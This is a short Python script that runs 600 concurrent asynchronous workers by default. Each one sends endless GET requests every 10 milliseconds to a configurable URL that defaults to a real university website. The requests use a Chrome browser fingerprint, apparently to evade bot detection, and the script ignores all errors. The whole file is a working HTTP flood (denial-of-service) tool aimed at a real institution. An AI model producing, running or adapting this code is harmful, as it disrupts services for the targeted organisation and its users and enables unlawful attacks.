import asyncio
from curl_cffi.requests import AsyncSession
import os
from dotenv import load_dotenv

load_dotenv()
LINK = os.getenv("LINK", "https://csulb.edu")
MULTIPLE_USERS = int(os.getenv("MULTIPLE_USERS", "600"))

async def worker(session):
    while True:
        try:
            response = await session.get(LINK, impersonate="chrome110")
            print(response.status_code)
        except Exception as e:
            pass
        await asyncio.sleep(0.01)

async def main():
    async with AsyncSession() as session:
        workers = [worker(session) for _ in range(MULTIPLE_USERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Stopped.")
